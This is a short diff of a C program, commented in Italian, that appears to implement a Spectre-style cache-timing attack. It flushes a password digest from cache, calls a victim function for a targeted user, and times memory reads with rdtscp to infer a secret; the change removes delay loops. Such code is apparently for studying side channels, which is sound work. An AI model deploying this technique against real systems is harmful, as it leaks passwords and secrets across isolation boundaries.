@@ -109,31 +109,16 @@ int main(int argn, char *argv[]) {
 					_mm_clflush(&passwordDigest[i]);
 				}
 
-				/*introduzione di ritardi per essere sicuri
-				 * dell'esecuzione delle istruzioni precedenti
-				 * (si puo usare anche mfence)*/
-				for (volatile int z = 0; z < 100; z++) {
-				}
+				/*for (volatile int z = 0; z < 100; z++) {
+				}*/
 
 				// richiamo la funzione vittima con l'ID da attaccare
 				victim_function(userUnderAttack, 1);
-
-				/*introduzione di ritardi per essere sicuri
-				 * dell'esecuzione delle istruzioni precedenti
-				 * (si puo usare anche mfence)*/
-				for (volatile int z = 0; z < 100; z++) {
-				}
 
 				// calcolo il tempo di accesso alla posizione l
 				time1 = __rdtscp(&timeReg);
 				timeReg = array2[l * delta];
 				time2 = __rdtscp(&timeReg) - time1;
-
-				/*introduzione di ritardi per essere sicuri
-				 * dell'esecuzione delle istruzioni precedenti
-				 * (si puo usare anche mfence)*/
-				for (volatile int z = 0; z < 100; z++) {
-				}
 
 				// aggiorno la posizione corrispondente di results
 				// se il tempo < della soglia
@@ -173,7 +158,8 @@ int main(int argn, char *argv[]) {
 					numberOfRuns);
 			noHit++;
 		} else {
-			printf("----- ERROR: prediction between %d and %d, secret = %d -----\n",
+			printf(
+					"----- ERROR: prediction between %d and %d, secret = %d -----\n",
 					rangeMin, rangeMax, secret[userUnderAttack]);
 			error++;
 		}
